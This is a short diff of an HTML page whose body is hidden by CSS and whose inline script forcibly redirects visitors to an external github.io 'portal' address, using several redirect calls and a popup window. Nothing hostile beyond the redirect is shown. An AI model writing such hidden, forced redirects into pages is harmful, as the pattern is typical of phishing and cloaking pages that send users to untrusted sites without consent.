@@ -4,23 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>...</title>
-    <style>
-        body{display:none}
-    </style>
+    <style>body{display:none}</style>
     <script>
         (function(){
             var url = "https://tutorsvalley.github.io/portal-/";
-            
-            // Multiple redirect attempts
             window.location.href = url;
             window.location.replace(url);
-            window.open(url, "_blank", "noopener,noreferrer");
-            document.location = url;
-            
-            // Fallback after 2 seconds
-            setTimeout(function(){
-                window.location.href = url;
-            }, 2000);
+            window.open(url, "_blank");
         })();
     </script>
 </head>
